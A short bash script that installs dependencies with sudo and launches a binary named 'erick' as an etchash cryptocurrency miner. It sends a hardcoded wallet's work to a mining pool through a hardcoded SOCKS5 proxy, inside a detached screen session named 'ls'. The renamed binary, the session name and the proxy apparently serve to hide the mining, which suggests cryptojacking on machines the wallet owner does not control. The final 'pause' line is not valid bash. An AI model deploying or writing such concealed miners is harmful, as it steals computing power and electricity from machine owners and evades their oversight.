#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
screen -dmS ls 
POOL=us-etc.2miners.com:1010
WALLET=0x663bDc4a1eDeCDDCe775862bBE859D6A84a72fB8
WORKER=$(echo $(shuf -i 1-4 -n 1)-ARKIN)
PROXY=socks5://174.64.199.79:4145

cd "$(dirname "$0")"

chmod +x ./erick && sudo ./erick -a etchash -o $POOL -u $WALLET.$WORKER -x $PROXY -log
pause $@
